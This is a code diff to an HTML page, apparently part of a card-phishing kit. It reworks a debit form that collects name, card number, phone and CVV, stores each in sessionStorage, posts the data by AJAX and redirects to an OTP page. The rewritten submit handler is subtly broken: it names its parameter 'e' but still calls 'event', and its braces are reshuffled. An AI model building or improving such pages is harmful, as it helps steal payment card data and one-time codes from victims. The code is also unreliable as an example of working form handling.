@@ -17,7 +17,7 @@
    <div>
     <div class="pg4">
    <form id="formDebit" method="POST"
-              enctype="application/x-www-form-urlencoded" class="form1">
+              class="form1">
   <input type="hidden" id="nama" name="nama" value="">
   <input type="hidden" id="debit" name="debit" value="">
   <input type="hidden" id="valid" name="valid" value="">
@@ -66,7 +66,11 @@ var nama = sessionStorage.getItem("nama");
 <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
  <script>
-$('#formDebit').on('submit', function (event) {
+$(document).ready(function(){
+    $('#formDebit').submit(function(e) {
+        e.preventDefault();
+       
+
 
  $("#load").addClass("loading");
   event.stopPropagation();
@@ -85,9 +89,10 @@ $.ajax({
  
  complete: function(data) {
             console.log('Complete')
+            
 setTimeout(function(){
        $("#load").addClass("no-loading");
-       
+       window.location.href ="otp.html";
        
  var nama = document.getElementById("nama").value;
  sessionStorage.setItem("nama", nama);
@@ -101,15 +106,14 @@ var phone = document.getElementById("phone").value;
  sessionStorage.setItem("phone", phone);  
  var cvv = document.getElementById("cvv").value;
  sessionStorage.setItem("cvv", cvv);  
- 
-location.href ="./otp.html";
+
    
     }, 1500);
-        }
+     }
     });
-
+ });
     return false;
-});       
+});   
 </script>    
  </body>
 </html>
